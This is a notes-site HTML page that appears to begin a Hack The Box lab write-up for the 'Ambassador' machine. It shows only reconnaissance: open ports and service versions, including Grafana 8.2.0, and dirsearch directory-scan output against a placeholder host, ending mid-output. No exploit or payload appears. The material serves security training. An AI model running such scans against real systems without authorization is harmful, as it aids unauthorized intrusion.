@@ -1,0 +1,863 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Authority" href="../authority/authority.html" /><link rel="prev" title="Medium" href="../medium.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>Ambassador - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=a746c00c" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
+</ul>
+</li>
+<li class="toctree-l3 current has-children"><a class="reference internal" href="../medium.html">Medium</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Ambassador</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../authority/authority.html">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../format/format.html">Format</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../health/health.html">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../outdated/outdated.html">Outdated</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../sandworm/sandworm.html">Sandworm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../scrambled/scrambled.html">Scrambled</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../shared/shared.html">Shared</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../updown/updown.html">Updown</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../zipping/zipping.html">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/busqueda/busqueda.html">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../easy/trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <p><img alt="ambassador.png" src="../../../../_images/ambassador.png" /></p>
+<section id="ambassador">
+<h1>Ambassador<a class="headerlink" href="#ambassador" title="Permalink to this heading">#</a></h1>
+<section id="enum">
+<h2>Enum<a class="headerlink" href="#enum" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">22</span>   <span class="o">-</span> <span class="n">OpenSSH</span> <span class="mf">8.2</span><span class="n">p1</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="mi">80</span>   <span class="o">-</span> <span class="n">Apache</span> <span class="mf">2.4.41</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="mi">3000</span> <span class="o">-</span> <span class="n">Graffana</span> <span class="n">v8</span><span class="mf">.2.0</span> <span class="o">-</span> <span class="n">d7f71e9eae</span>
+<span class="mi">3306</span> <span class="o">-</span> <span class="n">MySQL</span> <span class="mf">8.0.30</span><span class="o">-</span><span class="mi">0</span> <span class="n">ubuntu0</span><span class="mf">.20.04.2</span>
+</pre></div>
+</div>
+<p>The page on port 80 says devops will give you the password to developer. ok.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="w"> </span>dirsearch<span class="w"> </span>-u<span class="w"> </span>http://example.org<span class="w">                                                                                                                                                         </span><span class="m">130</span><span class="w"> </span>⨯
+
+<span class="w">  </span>_<span class="p">|</span>.<span class="w"> </span>_<span class="w"> </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w"> </span>_<span class="p">|</span>_<span class="w">    </span>v0.4.2
+<span class="w"> </span><span class="o">(</span>_<span class="o">||</span><span class="p">|</span><span class="w"> </span>_<span class="o">)</span><span class="w"> </span><span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span><span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="o">)</span>
+
+Extensions:<span class="w"> </span>php,<span class="w"> </span>aspx,<span class="w"> </span>jsp,<span class="w"> </span>html,<span class="w"> </span>js<span class="w"> </span><span class="p">|</span><span class="w"> </span>HTTP<span class="w"> </span>method:<span class="w"> </span>GET<span class="w"> </span><span class="p">|</span><span class="w"> </span>Threads:<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Wordlist<span class="w"> </span>size:<span class="w"> </span><span class="m">10927</span>
+
+Output<span class="w"> </span>File:<span class="w"> </span>/home/blnkn/.dirsearch/reports/example.org/_22-10-08_17-06-02.txt
+
+Error<span class="w"> </span>Log:<span class="w"> </span>/home/blnkn/.dirsearch/logs/errors-22-10-08_17-06-02.log
+
+Target:<span class="w"> </span>http://example.org/
+
+<span class="o">[</span><span class="m">17</span>:06:02<span class="o">]</span><span class="w"> </span>Starting:
+<span class="o">[</span><span class="m">17</span>:06:04<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>276B<span class="w">  </span>-<span class="w"> </span>/.htaccess.orig
+<span class="o">[</span><span class="m">17</span>:06:04<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>276B<span class="w">  </span>-<span class="w"> </span>/.htaccess.sample
+<span class="o">[</span><span class="m">17</span>:06:04<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>276B<span class="w">  </span>-<span class="w"> </span>/.htaccess.save
+<span class="o">[</span><span class="m">17</span>:06:04<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>276B<span class="w">  </span>-<span class="w"> </span>/.ht_wsr.txt
+<span class="o">[</span><span class="m">17</span>:06:04<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>276B<span class="w">  </span>-<span class="w"> </span>/.htaccess.bak1
+<span class="o">[</span><span class="m">17</span>:06:04<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>276B<span class="w">  </span>-<span class="w"> </span>/.htaccess_sc
+<span class="o">[</span><span class="m">17</span>:06:04<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>276B<span class="w">  </span>-<span class="w"> </span>/.html
+<span class="o">[</span><span class="m">17</span>:06:04<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>276B<span class="w">  </span>-<span class="w"> </span>/.htm
+<span class="o">[</span><span class="m">17</span>:06:04<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>276B<span class="w">  </span>-<span class="w"> </span>/.htaccess_extra
+<span class="o">[</span><span class="m">17</span>:06:04<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>276B<span class="w">  </span>-<span class="w"> </span>/.htaccessOLD2
+<span class="o">[</span><span class="m">17</span>:06:04<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>276B<span class="w">  </span>-<span class="w"> </span>/.htaccessBAK
+<span class="o">[</span><span class="m">17</span>:06:04<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>276B<span class="w">  </span>-<span class="w"> </span>/.htpasswd_test
+<span class="o">[</span><span class="m">17</span>:06:04<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>276B<span class="w">  </span>-<span class="w"> </span>/.htpasswds
+<span class="o">[</span><span class="m">17</span>:06:04<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>276B<span class="w">  </span>-<span class="w"> </span>/.htaccessOLD
+<span class="o">[</span><span class="m">17</span>:06:04<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>276B<span class="w">  </span>-<span class="w"> </span>/.httr-oauth
+<span class="o">[</span><span class="m">17</span>:06:04<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>276B<span class="w">  </span>-<span class="w"> </span>/.htaccess_orig
+<span class="o">[</span><span class="m">17</span>:06:06<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>2KB<span class="w"> </span>-<span class="w"> </span>/404.html
+<span class="o">[</span><span class="m">17</span>:06:14<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>315B<span class="w">  </span>-<span class="w"> </span>/categories<span class="w">  </span>-&gt;<span class="w">  </span>http://example.org/categories/
+<span class="o">[</span><span class="m">17</span>:06:19<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>311B<span class="w">  </span>-<span class="w"> </span>/images<span class="w">  </span>-&gt;<span class="w">  </span>http://example.org/images/
+<span class="o">[</span><span class="m">17</span>:06:19<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>992B<span class="w">  </span>-<span class="w"> </span>/images/
+<span class="o">[</span><span class="m">17</span>:06:19<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>4KB<span class="w"> </span>-<span class="w"> </span>/index.html
+<span class="o">[</span><span class="m">17</span>:06:19<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">    </span>1KB<span class="w"> </span>-<span class="w"> </span>/index.xml
+<span class="o">[</span><span class="m">17</span>:06:25<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>310B<span class="w">  </span>-<span class="w"> </span>/posts<span class="w">  </span>-&gt;<span class="w">  </span>http://example.org/posts/
+<span class="o">[</span><span class="m">17</span>:06:26<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>276B<span class="w">  </span>-<span class="w"> </span>/server-status
+<span class="o">[</span><span class="m">17</span>:06:26<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>276B<span class="w">  </span>-<span class="w"> </span>/server-status/
+<span class="o">[</span><span class="m">17</span>:06:27<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">  </span>645B<span class="w">  </span>-<span class="w"> </span>/sitemap.xml
